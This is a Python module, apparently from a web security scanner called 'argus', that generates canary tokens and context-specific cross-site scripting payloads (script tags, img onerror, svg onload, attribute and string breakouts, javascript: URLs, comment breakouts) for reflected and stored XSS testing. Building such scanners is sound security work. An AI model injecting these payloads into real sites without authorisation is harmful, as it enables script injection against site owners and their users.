"""Context-aware XSS payload generation."""
from __future__ import annotations

import re
import uuid
from typing import Dict, List, Tuple

from argus.collectors.xss.models import XSSContext


class XSSPayloadGenerator:
    """
    Generates unique canary tokens, context-specific escape payloads,
    multi-context default suites, and stored XSS test payloads.
    """

    def __init__(self):
        pass

    def generate_canary(self, prefix: str = "argusxss") -> str:
        """
        Generates a unique alphanumeric canary string with a UUID suffix.
        """
        token = uuid.uuid4().hex[:8]
        clean_prefix = re.sub(r"[^a-zA-Z0-9]", "", prefix) or "argusxss"
        return f"{clean_prefix}{token}"

    def get_canary_probe(self, canary: str) -> str:
        """
        Returns a benign canary probe for initial reflection and context discovery.
        """
        return str(canary)

    def get_context_payloads(self, context: XSSContext, canary: str) -> List[Dict[str, str]]:
        """
        Returns targeted payload dictionaries containing 'payload' and 'breakout'
        tailored for the specified HTML syntactic context.
        """
        if context == XSSContext.HTML_BODY:
            return [
                {"payload": f"<script>/*{canary}*/</script>", "breakout": f"<script>/*{canary}*/</script>"},
                {"payload": f"<img src=x onerror=alert('{canary}')>", "breakout": f"<img src=x onerror=alert('{canary}')>"},
                {"payload": f"<svg onload=alert('{canary}')>", "breakout": f"<svg onload=alert('{canary}')>"},
                {"payload": f"<b>{canary}</b>", "breakout": f"<b>{canary}</b>"},
            ]
        elif context == XSSContext.ATTRIBUTE_DOUBLE:
            return [
                {"payload": f'"><script>/*{canary}*/</script>', "breakout": '"><script>'},
                {"payload": f'" onfocus="alert(\'{canary}\')', "breakout": '" onfocus="'},
                {"payload": f'" autofocus onfocus="alert(\'{canary}\')', "breakout": '" autofocus onfocus="'},
                {"payload": f'"><b>{canary}</b>', "breakout": '">' + f"<b>{canary}</b>"},
            ]
        elif context == XSSContext.ATTRIBUTE_SINGLE:
            return [
                {"payload": f"\'><script>/*{canary}*/</script>", "breakout": "\'><script>"},
                {"payload": f"' onfocus='alert(\"{canary}\")", "breakout": "' onfocus='"},
                {"payload": f"' autofocus onfocus='alert(\"{canary}\")", "breakout": "' autofocus onfocus='"},
                {"payload": f"'><b>{canary}</b>", "breakout": "'>" + f"<b>{canary}</b>"},
            ]
        elif context == XSSContext.ATTRIBUTE_UNQUOTED:
            return [
                {"payload": f" onfocus=alert('{canary}')", "breakout": " onfocus="},
                {"payload": f" autofocus onfocus=alert('{canary}')", "breakout": " autofocus onfocus="},
                {"payload": f"><script>/*{canary}*/</script>", "breakout": "><script>"},
            ]
        elif context == XSSContext.SCRIPT_STRING_DOUBLE:
            return [
                {"payload": f'";alert("{canary}");//', "breakout": '";alert('},
                {"payload": f'</script><script>alert("{canary}")</script>', "breakout": "</script><script>"},
                {"payload": f'"+alert("{canary}")+"', "breakout": '"+alert('},
            ]
        elif context == XSSContext.SCRIPT_STRING_SINGLE:
            return [
                {"payload": f"';alert('{canary}');//", "breakout": "';alert("},
                {"payload": f"</script><script>alert('{canary}')</script>", "breakout": "</script><script>"},
                {"payload": f"'+alert('{canary}')+'", "breakout": "'+alert("},
            ]
        elif context == XSSContext.SCRIPT_BLOCK:
            return [
                {"payload": f"alert('{canary}')", "breakout": f"alert('{canary}')"},
                {"payload": f"</script><script>alert('{canary}')</script>", "breakout": "</script><script>"},
            ]
        elif context == XSSContext.URL_ATTRIBUTE:
            return [
                {"payload": f"javascript:alert('{canary}')", "breakout": "javascript:alert"},
                {"payload": f"javascript:/*{canary}*/", "breakout": "javascript:"},
            ]
        elif context == XSSContext.COMMENT:
            return [
                {"payload": f"--> <script>/*{canary}*/</script>", "breakout": "--> <script>"},
                {"payload": f"--><img src=x onerror=alert('{canary}')>", "breakout": "--><img"},
            ]
        else:  # UNKNOWN
            return [
                {"payload": f"<script>/*{canary}*/</script>", "breakout": f"<script>/*{canary}*/</script>"},
                {"payload": f'"><script>/*{canary}*/</script>', "breakout": '"><script>'},
                {"payload": f"\'><script>/*{canary}*/</script>", "breakout": "\'><script>"},
                {"payload": f'";alert("{canary}");//', "breakout": '";alert('},
                {"payload": f"';alert('{canary}');//", "breakout": "';alert("},
                {"payload": f"<img src=x onerror=alert('{canary}')>", "breakout": f"<img src=x onerror=alert('{canary}')>"},
                {"payload": f"javascript:alert('{canary}')", "breakout": "javascript:alert"},
            ]

    def get_default_payload_suite(self, canary: str) -> List[Tuple[str, XSSContext, str]]:
        """
        Returns a multi-context payload suite covering Body, Attribute, Script, and URL contexts.
        Each entry is a tuple: (payload, context, breakout_marker).
        """
        return [
            (f"<script>/*{canary}*/</script>", XSSContext.HTML_BODY, f"<script>/*{canary}*/</script>"),
            (f"<img src=x onerror=alert('{canary}')>", XSSContext.HTML_BODY, f"<img src=x onerror=alert('{canary}')>"),
            (f"<svg onload=alert('{canary}')>", XSSContext.HTML_BODY, f"<svg onload=alert('{canary}')>"),
            (f'"><script>/*{canary}*/</script>', XSSContext.ATTRIBUTE_DOUBLE, '"><script>'),
            (f'" onfocus="alert(\'{canary}\')', XSSContext.ATTRIBUTE_DOUBLE, '" onfocus="'),
            (f"\'><script>/*{canary}*/</script>", XSSContext.ATTRIBUTE_SINGLE, "\'><script>"),
            (f"' onfocus='alert(\"{canary}\")", XSSContext.ATTRIBUTE_SINGLE, "' onfocus='"),
            (f" onfocus=alert('{canary}')", XSSContext.ATTRIBUTE_UNQUOTED, " onfocus="),
            (f'";alert("{canary}");//', XSSContext.SCRIPT_STRING_DOUBLE, '";alert('),
            (f"';alert('{canary}');//", XSSContext.SCRIPT_STRING_SINGLE, "';alert("),
            (f"javascript:alert('{canary}')", XSSContext.URL_ATTRIBUTE, "javascript:alert"),
        ]

    def get_stored_payload(self, canary: str) -> str:
        """
        Generates a high-confidence test payload for stored XSS validation.
        """
        return f"<b id=\"argus_stored_{canary}\">{canary}</b><script>/*{canary}*/</script>"

